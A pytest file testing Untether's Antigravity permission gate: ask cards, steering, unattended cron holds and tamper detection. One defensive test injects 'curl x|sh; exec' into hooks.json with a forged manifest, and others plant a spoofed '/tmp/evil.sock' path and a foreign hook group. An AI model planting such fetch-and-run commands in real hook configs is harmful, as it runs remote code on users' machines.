"""The agy gate end to end through ``AntigravityRunner.run`` (#980, #981).

A fake ``agy`` replays the live probe's stream and, where agy would, runs
the gate plugin's REAL hook command through ``sh -c`` — the shell guard,
``$UNTETHER_AGY_GATE_PY -I -m untether.antigravity.gate_hook`` and the
per-run socket the runner serves (``tests/fake_clis/fake_agy.py``,
``hook:`` directives; scripts ``gate_ask`` / ``gate_steer``).
"""

from __future__ import annotations

import json
import os
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import anyio
import pytest
import structlog.testing

from tests.antigravity_gate_support import hooks_listing, install_plugin, short_dir
from untether.antigravity import gate_hook, gate_precheck, gate_server
from untether.interactive import answer_ask_question
from untether.model import ActionEvent, CompletedEvent, StartedEvent
from untether.runners import antigravity as agy
from untether.runners.antigravity import AntigravityRunner
from untether.runners.run_options import EngineRunOptions, set_run_options
from untether.utils.paths import (
    reset_run_base_dir,
    reset_run_channel_id,
    set_run_base_dir,
    set_run_channel_id,
)

FAKE_AGY = Path(__file__).parent / "fake_clis" / "fake_agy.py"
CHAT = 4242


@pytest.fixture
def project(tmp_path: Path) -> Iterator[Path]:
    proj = tmp_path / "proj"
    proj.mkdir()
    token = set_run_base_dir(proj)
    chat = set_run_channel_id(CHAT)
    try:
        yield proj
    finally:
        reset_run_channel_id(chat)
        reset_run_base_dir(token)


@pytest.fixture
def gate_env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> dict[str, Path]:
    """Plugin installed, ``-p /hooks`` lists it, sockets in a short dir."""
    monkeypatch.setenv("XDG_RUNTIME_DIR", str(short_dir()))
    gate_server._reset_for_tests()
    gate_precheck.clear_cache()
    folder = install_plugin()

    async def listing(runner: Any, cwd: Path) -> dict[str, Any]:
        return hooks_listing()

    monkeypatch.setattr(gate_precheck, "_probe_hooks", listing)
    log = tmp_path / "hooks.log"
    record = tmp_path / "record.json"
    monkeypatch.setenv("UNTETHER_FAKE_AGY_HOOKS_JSON", str(folder / "hooks.json"))
    monkeypatch.setenv("UNTETHER_FAKE_AGY_HOOK_LOG", str(log))
    monkeypatch.setenv("UNTETHER_FAKE_AGY_RECORD", str(record))
    return {"log": log, "record": record, "go": tmp_path / "go"}


def _hook_log(path: Path) -> list[dict[str, Any]]:
    if not path.exists():
        return []
    return [json.loads(line) for line in path.read_text().splitlines()]


def _runner() -> AntigravityRunner:
    assert os.access(FAKE_AGY, os.X_OK)
    return AntigravityRunner(antigravity_cmd=str(FAKE_AGY))


def _contract(events: list[Any]) -> CompletedEvent:
    assert isinstance(events[0], StartedEvent)
    assert isinstance(events[-1], CompletedEvent)
    assert all(isinstance(e, ActionEvent) for e in events[1:-1])
    return events[-1]


@pytest.mark.anyio
async def test_ask_question_card_and_answer_reason(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """E3 replay: the card appears, a typed answer reaches the model as the
    deny reason, the step is shown answered (never failed)."""
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "gate_ask")
    events: list[Any] = []
    with structlog.testing.capture_logs() as logs:
        async with anyio.create_task_group() as tg:
            async for evt in _runner().run("ask me", None):
                events.append(evt)
                if (
                    isinstance(evt, ActionEvent)
                    and evt.phase == "started"
                    and evt.action.detail.get("ask_flow")
                ):
                    tg.start_soon(
                        answer_ask_question, evt.action.detail["request_id"], "blue"
                    )
    done = _contract(events)
    assert done.ok and done.answer.startswith("blue")
    titles = [(e.phase, e.action.title) for e in events if isinstance(e, ActionEvent)]
    assert ("started", "❓ Which colour do you prefer?") in titles
    assert ("completed", "❓ answered: blue") in titles
    pre_tool = [h for h in _hook_log(gate_env["log"]) if h["event"] == "PreToolUse"]
    assert pre_tool and json.loads(pre_tool[0]["out"])["decision"] == "deny"
    assert '"blue"' in json.loads(pre_tool[0]["out"])["reason"]
    names = [log["event"] for log in logs]
    assert "antigravity.gate.request" in names
    assert "antigravity.gate.decision" in names
    decision = next(log for log in logs if log["event"] == "antigravity.gate.decision")
    assert decision["decision"] == "deny" and decision["kind"] == "answer"
    # The token is never logged; only its length.
    token_logs = [log for log in logs if "token_len" in log]
    assert token_logs and all("token" not in log for log in token_logs)
    # The marker env reached agy (and only agy's hooks read it).
    env_keys = json.loads(gate_env["record"].read_text())["env_keys"]
    assert gate_hook.ENV_MARKER in env_keys and gate_hook.ENV_SOCK in env_keys
    # The socket is gone after the run.
    assert gate_server._RUNS == {}


@pytest.mark.anyio
async def test_steer_injected_and_ack_on_user_input_step(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "gate_steer")
    monkeypatch.setenv("UNTETHER_FAKE_AGY_GO", str(gate_env["go"]))
    events: list[Any] = []
    with structlog.testing.capture_logs() as logs:
        async for evt in _runner().run("read notes", None):
            events.append(evt)
            if isinstance(evt, StartedEvent):
                out = await gate_server.STEER_BACKEND.steer(
                    evt.resume.value, "also say PINEAPPLE", command_uuid="u-1"
                )
                assert out == "steered"
                gate_env["go"].write_text("go")
    done = _contract(events)
    assert done.ok and "PINEAPPLE" in done.answer
    notes = [
        e
        for e in events
        if isinstance(e, ActionEvent) and e.action.detail.get("absorbed_command_uuid")
    ]
    assert notes and notes[0].action.title.startswith("↪️ steer received: also say")
    assert notes[0].action.detail["absorbed_command_uuid"] == "u-1"
    names = [log["event"] for log in logs]
    assert names.index("antigravity.steer.injected") < names.index(
        "antigravity.steer.delivered"
    )
    delivered = next(
        log for log in logs if log["event"] == "antigravity.steer.delivered"
    )
    assert delivered["step"] == 1
    # The injected user_input step started no turn of its own.
    assert sum(isinstance(e, StartedEvent) for e in events) == 1
    assert sum(isinstance(e, CompletedEvent) for e in events) == 1
    # Liveness held: a PreInvocation reached Untether before the model step.
    assert "antigravity.gate.not_running" not in names


@pytest.mark.anyio
async def test_no_plugin_no_marker_env(
    project: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Without the plugin nothing changes: no socket, no marker env — and a
    marker inherited from Untether's own env is stripped (D22)."""
    record = tmp_path / "record.json"
    monkeypatch.setenv("UNTETHER_FAKE_AGY_RECORD", str(record))
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    monkeypatch.setenv(gate_hook.ENV_MARKER, "1")
    monkeypatch.setenv(gate_hook.ENV_SOCK, "/tmp/evil.sock")
    gate_server._reset_for_tests()
    events = [evt async for evt in _runner().run("hi", None)]
    assert _contract(events).ok
    env_keys = json.loads(record.read_text())["env_keys"]
    assert not [k for k in env_keys if k.startswith(gate_hook.ENV_MARKER)]
    assert gate_server._RUNS == {}


@pytest.mark.anyio
async def test_inherited_marker_replaced_by_the_runs_own(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    monkeypatch.setenv(gate_hook.ENV_SOCK, "/tmp/evil.sock")
    captured: dict[str, str] = {}
    real_env = AntigravityRunner.env

    def spy(self: AntigravityRunner, *, state: Any) -> dict[str, str] | None:
        env = real_env(self, state=state)
        if state is not None and env is not None:
            captured.update(env)
        return env

    monkeypatch.setattr(AntigravityRunner, "env", spy)
    events = [evt async for evt in _runner().run("hi", None)]
    assert _contract(events).ok
    assert captured[gate_hook.ENV_SOCK] != "/tmp/evil.sock"
    assert captured[gate_hook.ENV_SOCK].endswith(".sock")


@pytest.mark.anyio
async def test_precheck_failure_runs_without_gate(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """Workspace doesn't rely on the gate: a plugin agy doesn't list only
    means no questions / steer for the run."""

    async def disabled(runner: Any, cwd: Path) -> dict[str, Any]:
        return hooks_listing(enabled=False)

    monkeypatch.setattr(gate_precheck, "_probe_hooks", disabled)
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    with structlog.testing.capture_logs() as logs:
        events = [evt async for evt in _runner().run("hi", None)]
    assert _contract(events).ok
    env_keys = json.loads(gate_env["record"].read_text())["env_keys"]
    assert gate_hook.ENV_MARKER not in env_keys
    failed = [log for log in logs if log["event"] == "antigravity.gate.precheck_failed"]
    assert failed and failed[0]["reason"] == gate_precheck.DISABLED


@pytest.mark.anyio
async def test_edited_plugin_warns_attended_and_holds_unattended(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    from untether.antigravity import gate_plugin

    (gate_plugin.plugin_dir() / "hooks.json").write_text("{}")
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    events = [evt async for evt in _runner().run("hi", None)]
    done = _contract(events)
    assert done.ok
    warned = [
        e
        for e in events
        if isinstance(e, ActionEvent) and e.action.id == "antigravity.gate.changed"
    ]
    assert warned and "isn't what Untether installed" in warned[0].action.title
    token = set_run_options(EngineRunOptions(unattended_trigger="cron:nightly"))
    try:
        held = [evt async for evt in _runner().run("hi", None)]
    finally:
        from untether.runners.run_options import reset_run_options

        reset_run_options(token)
    assert len(held) == 1 and isinstance(held[0], CompletedEvent) and not held[0].ok
    assert held[0].usage[agy.PRESPAWN_BLOCKED_KEY] == agy.CONFIG_CHANGED_BLOCK
    # #1078: only a reinstall releases this hold, not the next chat message.
    error = held[0].error or ""
    assert "edited since install: hooks.json" in error
    assert "`untether agy-gate install --force`" in error
    assert "a message in the chat doesn't release them" in error
    assert "next message" not in error and "runs again after that" not in error


@pytest.mark.anyio
async def test_edited_plugin_is_reported_by_its_own_row_only_1083(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """#1083: an edited gate plugin also showed up in the generic "hooks,
    plugins or MCP servers that Untether doesn't manage" row, listing
    Untether's own files. Only the plugin-changed row names that folder; a
    genuinely foreign plugin beside it is still listed. The final repeats
    the rows with the command as code, not literal backticks."""
    from untether.antigravity import gate_plugin
    from untether.telegram.render import render_markdown

    folder = gate_plugin.plugin_dir()
    (folder / gate_plugin.HOOKS_FILE).write_text("{}")
    foreign = folder.parent / "someone-elses"
    foreign.mkdir()
    (foreign / "hooks.json").write_text("{}")
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    with structlog.testing.capture_logs() as logs:
        events = [evt async for evt in _runner().run("hi", None)]
    done = _contract(events)
    rows = {
        e.action.id: e.action
        for e in events
        if isinstance(e, ActionEvent) and e.action.kind == "warning"
    }
    assert "isn't what Untether installed" in rows["antigravity.gate.changed"].title
    present = rows["antigravity.config.present"]
    assert present.detail["paths"] == [
        "~/.gemini/config/plugins/someone-elses/hooks.json"
    ]
    assert "untether-gate" not in present.title
    # The scan still tracks the plugin's files (digest, log, cron hold).
    (seen,) = [r for r in logs if r["event"] == "antigravity.workspace_config_present"]
    assert any("plugins/untether-gate/" in p for p in seen["paths"])
    text, entities = render_markdown(done.answer)
    assert "`" not in text
    utf16 = text.encode("utf-16-le")
    codes = [
        utf16[2 * e["offset"] : 2 * (e["offset"] + e["length"])].decode("utf-16-le")
        for e in entities
        if e["type"] == "code"
    ]
    assert "untether agy-gate status" in codes


@pytest.mark.anyio
async def test_edited_plugin_alone_shows_no_generic_row_1083(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    from untether.antigravity import gate_plugin

    (gate_plugin.plugin_dir() / gate_plugin.HOOKS_FILE).write_text("{}")
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    events = [evt async for evt in _runner().run("hi", None)]
    _contract(events)
    ids = [e.action.id for e in events if isinstance(e, ActionEvent)]
    assert "antigravity.gate.changed" in ids
    assert "antigravity.config.present" not in ids


@pytest.mark.anyio
async def test_outdated_plugin_says_to_reinstall(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """Security review 3 M3 changed the plugin's hook commands: an install
    from an earlier version (unedited, recorded) asks for a reinstall in
    plain words — in the chat's ⚠️ row and in a held cron's reply."""
    from untether.antigravity import gate_plugin

    folder = gate_plugin.plugin_dir()
    files = gate_plugin.template_files(gate_plugin.DEFAULT_WAIT_S, "1")
    for name, data in files.items():
        (folder / name).write_bytes(data)
    (folder / gate_plugin.MANIFEST_FILE).write_bytes(
        gate_plugin._manifest_bytes(files, gate_plugin.DEFAULT_WAIT_S)
    )
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    events = [evt async for evt in _runner().run("hi", None)]
    assert _contract(events).ok
    warned = [
        e
        for e in events
        if isinstance(e, ActionEvent) and e.action.id == "antigravity.gate.changed"
    ]
    assert warned and warned[0].action.title == agy.PLUGIN_OUTDATED_ROW
    assert "untether agy-gate install" in agy.PLUGIN_OUTDATED_ROW
    token = set_run_options(EngineRunOptions(unattended_trigger="cron:nightly"))
    try:
        held = [evt async for evt in _runner().run("hi", None)]
    finally:
        from untether.runners.run_options import reset_run_options

        reset_run_options(token)
    # Held either way: by the planted-config scan first (the plugin's files
    # are tracked like any other until they're this version's), then by the
    # plugin check, which says what to run.
    assert isinstance(held[0], CompletedEvent) and not held[0].ok
    assert held[0].usage[agy.PRESPAWN_BLOCKED_KEY] == agy.CONFIG_CHANGED_BLOCK
    assert "untether-gate" in (held[0].error or "")
    from untether.antigravity import gate_plugin as plugin

    install = plugin.inspect_install()
    assert agy.gate_plugin_outdated(install)
    message = agy.gate_plugin_held_message(install)
    assert "from another Untether version" in message
    assert "`untether agy-gate install` on the host" in message
    assert "--force" not in message


def test_gate_paths_come_from_the_live_config(tmp_path: Path) -> None:
    """H1 / M5: every project's ``@branch`` worktree root and the
    instance's ``files.outbox_dir`` reach the gate."""
    proj = tmp_path / "proj"
    other = tmp_path / "other"
    config = tmp_path / "untether.toml"
    config.write_text(
        'default_engine = "antigravity"\n'
        "[transports.telegram]\n"
        'bot_token = "123:abc"\n'
        "chat_id = 1\n"
        "allowed_user_ids = [1]\n"
        "[transports.telegram.files]\n"
        'outbox_dir = "out/box"\n'
        "[projects.proj]\n"
        f'path = "{proj}"\n'
        "[projects.other]\n"
        f'path = "{other}"\n'
        'worktrees_dir = "/abs/wt"\n'
    )
    outbox, roots = agy._gate_paths(config, proj)
    assert outbox == "out/box"
    assert set(roots) == {proj / ".worktrees", Path("/abs/wt")}
    # A folder that isn't a configured project keeps the default too.
    _, roots = agy._gate_paths(config, tmp_path / "scratch")
    assert tmp_path / "scratch" / ".worktrees" in roots
    # No config: the defaults.
    outbox, roots = agy._gate_paths(tmp_path / "missing.toml", proj)
    assert outbox == ".untether-outbox" and roots == (proj / ".worktrees",)


def test_liveness_without_preinvocation_marks_gate_dead() -> None:
    """13 §7.1: a model step with no PreInvocation before it."""
    from untether.events import EventFactory
    from untether.schemas import antigravity as agy_schema

    runner = AntigravityRunner()
    gate = gate_server.GateRun(config_path=None, factory=EventFactory("antigravity"))
    state = agy.AntigravityStreamState(factory=EventFactory("antigravity"), gate=gate)
    step = agy_schema.decode_event(
        b'{"event":"step_update","step_update":{"conversation_id":"c","step_index":1,'
        b'"state":"DONE","step_type":"agent_response"}}'
    )
    with structlog.testing.capture_logs() as logs:
        runner._gate_step(step.step_update, state)
    assert gate.dead and gate.closing
    assert [log for log in logs if log["event"] == "antigravity.gate.not_running"]
    # A required gate (phase 14's gated modes) stops the run instead.
    gate2 = gate_server.GateRun(
        config_path=None, factory=EventFactory("antigravity"), required=True
    )
    state2 = agy.AntigravityStreamState(factory=EventFactory("antigravity"), gate=gate2)
    runner._gate_step(step.step_update, state2)
    assert state2.kill_reason == "gate_not_running"
    assert agy._KILL_TEXT["gate_not_running"] == agy.GATE_NOT_RUNNING_TEXT


def test_resume_system_message_is_not_a_model_step() -> None:
    from untether.events import EventFactory
    from untether.schemas import antigravity as agy_schema

    gate = gate_server.GateRun(config_path=None, factory=EventFactory("antigravity"))
    state = agy.AntigravityStreamState(factory=EventFactory("antigravity"), gate=gate)
    for step_type in ("user_input", "system_message", "checkpoint"):
        step = agy_schema.decode_event(
            json.dumps(
                {
                    "event": "step_update",
                    "step_update": {
                        "conversation_id": "c",
                        "step_index": 1,
                        "state": "DONE",
                        "step_type": step_type,
                    },
                }
            ).encode()
        )
        AntigravityRunner()._gate_step(step.step_update, state)
    assert not gate.dead


def test_stop_not_fully_idle_changes_background_note() -> None:
    from untether.events import EventFactory

    gate = gate_server.GateRun(config_path=None, factory=EventFactory("antigravity"))
    state = agy.AntigravityStreamState(factory=EventFactory("antigravity"), gate=gate)
    assert state.background_hold_note() == agy.BACKGROUND_HOLD_NOTE
    gate.stop_not_idle = True
    assert state.background_hold_note() == agy.BACKGROUND_TURN_DONE_NOTE
    assert (
        agy.AntigravityStreamState(
            factory=EventFactory("antigravity")
        ).awaiting_user_approval()
        is False
    )


@pytest.mark.anyio
async def test_forged_manifest_still_counts_as_changed(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """Security review: hooks.json changed together with a manifest whose
    hashes match it is still not Untether's (fail closed): attended runs get
    the ⚠️ row and no gate, unattended runs are held."""
    import hashlib

    from untether.antigravity import gate_plugin
    from untether.runners.run_options import reset_run_options

    folder = gate_plugin.plugin_dir()
    hooks_file = folder / gate_plugin.HOOKS_FILE
    evil = hooks_file.read_bytes().replace(b"exec", b"curl x|sh; exec")
    hooks_file.write_bytes(evil)
    record = folder / gate_plugin.MANIFEST_FILE
    manifest = json.loads(record.read_text())
    manifest["files"][gate_plugin.HOOKS_FILE] = hashlib.sha256(evil).hexdigest()
    record.write_text(json.dumps(manifest))
    state = gate_plugin.inspect_install()
    assert state.managed and not state.edited and not state.current
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    events = [evt async for evt in _runner().run("hi", None)]
    assert _contract(events).ok
    assert any(
        isinstance(e, ActionEvent) and e.action.id == "antigravity.gate.changed"
        for e in events
    )
    env_keys = json.loads(gate_env["record"].read_text())["env_keys"]
    assert gate_hook.ENV_MARKER not in env_keys
    token = set_run_options(EngineRunOptions(unattended_trigger="cron:nightly"))
    try:
        held = [evt async for evt in _runner().run("hi", None)]
    finally:
        reset_run_options(token)
    assert held[0].usage[agy.PRESPAWN_BLOCKED_KEY] == agy.CONFIG_CHANGED_BLOCK
    # #1078: managed and unedited (only the bytes differ), so a plain
    # install replaces it; the text still says to check the change first.
    error = held[0].error or ""
    assert "`untether agy-gate install`" in error
    assert "Check what changed in" in error


# ── Ask me (#980, phase 14) ─────────────────────────────────────────────────


@pytest.mark.anyio
async def test_ask_me_run_end_to_end_allow_and_deny(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """Live-run replay under the bypass flag: Approve lets `echo allowme`
    run, Deny blocks `echo denyme` with agy's hook error, the in-project
    write passes on the safe list with no card, and the write outside the
    project asks (denied here)."""
    from untether.interactive import Decision, respond
    from untether.runners.run_options import reset_run_options

    (project / "README.md").write_text("hello\n")
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "gate_askme")
    events: list[Any] = []
    cards: list[ActionEvent] = []
    token = set_run_options(EngineRunOptions(permission_mode="ask"))
    try:
        with structlog.testing.capture_logs() as logs:
            async with anyio.create_task_group() as tg:
                async for evt in _runner().run("do the four steps", None):
                    events.append(evt)
                    if (
                        isinstance(evt, ActionEvent)
                        and evt.phase == "started"
                        and evt.action.detail.get("request_type") == "PreToolUse"
                    ):
                        cards.append(evt)
                        approved = "echo allowme" in evt.action.title
                        tg.start_soon(
                            respond,
                            evt.action.detail["request_id"],
                            Decision(
                                approved=approved,
                                action="approve" if approved else "deny",
                            ),
                        )
    finally:
        reset_run_options(token)
    done = _contract(events)
    assert done.ok
    # Bypass only after the gate precheck passed, and the default agent.
    argv = json.loads(gate_env["record"].read_text())["argv"]
    assert agy.BYPASS_FLAG in argv
    assert not [a for a in argv if a.startswith(("--agent", "--mode"))]
    names = [log["event"] for log in logs]
    assert names.index("antigravity.gate.precheck") < names.index("runner.start")
    # Three cards: the two shell commands and the write outside the project.
    titles = [c.action.title for c in cards]
    assert len(cards) == 3, titles
    assert titles[0].startswith(
        "Permission Request [agy] - shell command\n$ `echo allowme`"
    )
    assert "write a file (outside this project)" in titles[2]
    assert "+ outside" in titles[2]
    # Approve / Deny / Always for a shell command; no Always for a write.
    buttons = cards[0].action.detail["inline_keyboard"]["buttons"]
    assert [b["callback_data"].split(":")[1] for row in buttons for b in row] == [
        "approve",
        "deny",
        "always",
    ]
    assert len(cards[2].action.detail["inline_keyboard"]["buttons"]) == 1
    # How the steps ended.
    rows = {
        e.action.title: e
        for e in events
        if isinstance(e, ActionEvent)
        and e.phase == "completed"
        and e.action.id.startswith("step-")
    }
    assert rows["echo allowme"].ok is True
    assert rows["echo denyme"].ok is False
    assert rows["echo denyme"].message == "blocked: denied in Telegram"
    assert rows["README.md"].ok is True
    hook_outs = [
        json.loads(h["out"])
        for h in _hook_log(gate_env["log"])
        if h["event"] == "PreToolUse"
    ]
    assert [o["decision"] for o in hook_outs] == ["allow", "deny", "allow", "deny"]
    assert "Don't retry the same call" in hook_outs[1]["reason"]
    decisions = [
        (log["tool"], log["decision"], log["source"])
        for log in logs
        if log["event"] == "antigravity.gate.decision"
    ]
    assert decisions == [
        ("run_command", "allow", "user"),
        ("run_command", "deny", "user"),
        ("write_to_file", "allow", "policy"),
        ("write_to_file", "deny", "user"),
    ]
    # The gate was required (tripwire / liveness enforced) and never fired.
    listening = next(
        log for log in logs if log["event"] == "antigravity.gate.listening"
    )
    assert listening["required"] is True
    assert "antigravity.gate.tripwire" not in names
    assert "antigravity.gate.not_running" not in names
    assert gate_server._RUNS == {}


@pytest.mark.anyio
async def test_ask_me_unattended_trigger_denies_without_cards(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """#835 parity: a cron whose own permission_mode is `ask` runs gated;
    nothing waits for a tap — every tool off the safe list is denied at once
    and counted for the 🔒 footer."""
    from untether.runners.run_options import reset_run_options

    (project / "README.md").write_text("hello\n")
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "gate_askme")
    token = set_run_options(
        EngineRunOptions(
            permission_mode="ask",
            unattended_trigger="cron:nightly",
            trigger_permission_mode="ask",
        )
    )
    try:
        with structlog.testing.capture_logs() as logs:
            events = [evt async for evt in _runner().run("go", None)]
    finally:
        reset_run_options(token)
    done = _contract(events)
    assert done.ok
    assert not [
        e
        for e in events
        if isinstance(e, ActionEvent) and e.action.detail.get("request_type")
    ]
    notes = [
        e
        for e in events
        if isinstance(e, ActionEvent)
        and e.phase == "completed"
        and e.action.title.startswith("🔒 Unattended run")
    ]
    assert len(notes) == 1
    unattended = done.usage["unattended"]
    assert unattended["trigger"] == "cron:nightly"
    assert unattended["mode"] == "ask"
    assert unattended["denied"] == {"shell command": 2, "write a file": 1}
    assert "permission_mode" in unattended["hint"]
    denials = [log for log in logs if log["event"] == "permission.unattended_deny"]
    assert len(denials) == 3 and denials[0]["engine"] == "antigravity"
    argv = json.loads(gate_env["record"].read_text())["argv"]
    assert agy.BYPASS_FLAG in argv


@pytest.mark.anyio
async def test_ask_me_chat_mode_never_reaches_a_cron(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """REVIEW M3: a chat's Ask me doesn't give a cron the bypass flag — the
    cron runs as Workspace."""
    from untether.runners.run_options import reset_run_options

    agy._reset_permission_warnings()  # the downgrade warning is once per trigger
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    token = set_run_options(
        EngineRunOptions(permission_mode="ask", unattended_trigger="cron:nightly")
    )
    try:
        with structlog.testing.capture_logs() as logs:
            events = [evt async for evt in _runner().run("go", None)]
    finally:
        reset_run_options(token)
    assert _contract(events).ok
    argv = json.loads(gate_env["record"].read_text())["argv"]
    assert agy.BYPASS_FLAG not in argv
    assert "--mode=accept-edits" in argv
    assert [
        log for log in logs if log["event"] == "antigravity.unattended_ask_downgraded"
    ]


@pytest.mark.anyio
async def test_ask_me_refused_when_precheck_fails(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """`agy plugin disable untether-gate` (agy lists the group disabled):
    Ask me is refused before spawn with the repair hint — never run as
    something else (REVIEW-2 M17)."""
    from untether.runners.run_options import reset_run_options

    async def disabled(runner: Any, cwd: Path) -> dict[str, Any]:
        return hooks_listing(enabled=False)

    monkeypatch.setattr(gate_precheck, "_probe_hooks", disabled)
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    token = set_run_options(EngineRunOptions(permission_mode="ask"))
    try:
        events = [evt async for evt in _runner().run("go", None)]
    finally:
        reset_run_options(token)
    (done,) = events
    assert isinstance(done, CompletedEvent) and not done.ok
    assert done.usage == {agy.PRESPAWN_BLOCKED_KEY: agy.GATE_NOT_READY_BLOCK}
    assert "agy plugin enable untether-gate" in (done.error or "")
    assert not gate_env["record"].exists()


@pytest.mark.anyio
async def test_ask_me_refused_with_foreign_hook_group(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """REVIEW-2 B2: another hook group agy loads for the project runs shell
    outside the gate, so Ask me refuses (Workspace would run, with a ⚠️)."""
    from untether.runners.run_options import reset_run_options

    extra = {
        "name": "planted",
        "enabled": True,
        "source": ".agents/hooks.json",
        "actions": [
            {"event": "PreToolUse", "matcher": "*", "type": "command", "command": "x"}
        ],
    }

    async def listing(runner: Any, cwd: Path) -> dict[str, Any]:
        return hooks_listing(extra_groups=[extra])

    monkeypatch.setattr(gate_precheck, "_probe_hooks", listing)
    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    token = set_run_options(EngineRunOptions(permission_mode="ask"))
    try:
        events = [evt async for evt in _runner().run("go", None)]
    finally:
        reset_run_options(token)
    (done,) = events
    assert done.usage == {agy.PRESPAWN_BLOCKED_KEY: agy.GATE_FOREIGN_BLOCK}
    assert ".agents/hooks.json" in (done.error or "")
    assert not gate_env["record"].exists()


@pytest.mark.anyio
async def test_edited_plugin_cron_hold_says_only_a_reinstall_releases_it(
    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    """#1078: the first cron after the plugin was edited is held by the
    planted-config scan (the plugin's files are tracked once they aren't
    Untether's), and said the next chat message releases it. A chat message
    doesn't: the gate check holds every scheduled run until a reinstall."""
    from untether.antigravity import gate_plugin
    from untether.runners.run_options import reset_run_options

    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
    runner = _runner()

    async def cron() -> CompletedEvent:
        token = set_run_options(EngineRunOptions(unattended_trigger="cron:nightly"))
        try:
            events = [evt async for evt in runner.run("hi", None)]
        finally:
            reset_run_options(token)
        done = events[-1]
        assert isinstance(done, CompletedEvent)
        return done

    assert (await cron()).ok
    (gate_plugin.plugin_dir() / gate_plugin.HOOKS_FILE).write_text("{}")
    texts = []
    for _ in range(2):
        held = await cron()
        assert not held.ok
        assert held.usage[agy.PRESPAWN_BLOCKED_KEY] == agy.CONFIG_CHANGED_BLOCK
        texts.append(held.error or "")
        # An attended run between the two holds changes nothing for crons.
        assert _contract([evt async for evt in runner.run("hi", None)]).ok
    for text in texts:
        assert "`untether agy-gate install --force`" in text
        assert "runs again after that" not in text
    install_plugin()
    assert (await cron()).ok
